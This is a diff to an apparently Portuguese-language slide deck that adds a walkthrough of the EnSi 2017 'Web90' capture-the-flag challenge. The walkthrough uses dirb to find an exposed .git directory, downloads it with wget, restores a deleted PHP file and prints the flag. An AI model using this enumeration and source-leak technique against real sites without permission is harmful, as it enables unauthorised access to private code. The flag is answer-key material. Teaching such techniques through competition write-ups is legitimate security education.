@@ -404,6 +404,82 @@
                     <section data-background="images/background.webp" data-background-image="images/background.webp" data-background-size="100% 100%">
                         <h1>Web</h1>
 					</section>
+                    <!-- Web90 - EnSi 2017 -->
+                    <section data-background="images/background.webp" data-background-image="images/background.webp" data-background-size="100% 100%">
+                        <img width="300" height="300" data-src="images/ensi_web90.png" alt="ensi_web90">
+                        <p>Challenge de "Web" do EnSi 2017.</p>
+					</section>
+                    <section data-background="images/background.webp" data-background-image="images/background.webp" data-background-size="100% 100%">
+                        <img width="1200" height="500" data-src="images/ensi_web90_home.png" alt="ensi_web90_homes">
+                    </section>
+                    <section data-background="images/background.webp" data-background-image="images/background.webp" data-background-size="100% 100%">
+                        <h2>Analisando...</h2>
+                        <pre><code class="hlbash" data-trim>
+                            $ dirb http://web2.desafio.ensi.pop-ba.rnp.br/
+                            -----------------
+                            DIRB v2.22
+                            By The Dark Raver
+                            -----------------
+
+                            START_TIME: Sat Nov 25 15:13:55 2017
+                            URL_BASE: http://web2.desafio.ensi.pop-ba.rnp.br/
+                            WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+                            -----------------
+
+                            GENERATED WORDS: 4612
+
+                            ---- Scanning URL: http://web2.desafio.ensi.pop-ba.rnp.br/ ----
+                            + http://web2.desafio.ensi.pop-ba.rnp.br/.git/HEAD (CODE:200|SIZE:23)
+                            ==> DIRECTORY: http://web2.desafio.ensi.pop-ba.rnp.br/assets/
+                            ---- Entering directory: http://web2.desafio.ensi.pop-ba.rnp.br/assets/ ----
+
+                            -----------------
+                            END_TIME: Sat Nov 25 15:14:36 2017
+                            DOWNLOADED: 9224 - FOUND: 1
+                        </code></pre>
+                    </section>
+                    <section data-background="images/background.webp" data-background-image="images/background.webp" data-background-size="100% 100%">
+                        <h2>Analisando...</h2>
+                        <pre><code class="hlbash" data-trim>
+                            $ wget -r web2.desafio.ensi.pop-ba.rnp.br/.git/
+                            $ git status
+                            On branch master
+                            Your branch is up to date with 'origin/master'.
+
+                            Changes not staged for commit:
+                              (use "git add/rm [file]..." to update what will be committed)
+                              (use "git checkout -- [file]..." to discard changes in working directory)
+
+                                    deleted:    .gitmodules
+                                    deleted:    assets/gaintime
+                                    deleted:    index.php
+                                    deleted:    logged.php
+                                    deleted:    logout.php
+
+                            Untracked files:
+                              (use "git add [file]..." to include in what will be committed)
+
+                                    index.html
+                                    robots.txt
+
+                            no changes added to commit (use "git add" and/or "git commit -a")
+                        </code></pre>
+                    </section>
+                    <section data-background="images/rc.gif" data-background-image="images/rc.gif" data-background-size="100% 100%">
+                        <h2>Tome aí sua flag!</h2>
+                        <pre><code class="hlbash" data-trim>
+                            $ git checkout -- logged.php
+                            $ cat logged.php
+                            [...]
+                            [section]
+                                [div class="title"]
+                                        [h1]Flag[/h1]
+                                [/div]
+                                [div class="inform info"]ensi{ow4sp_t0p_10_2017-A5}[/div]
+                            [/section]
+                        </code></pre>
+                    </section>
                     <!-- Reverse -->
                     <section data-background="images/background.webp" data-background-image="images/background.webp" data-background-size="100% 100%">
                         <h1>Reverse</h1>
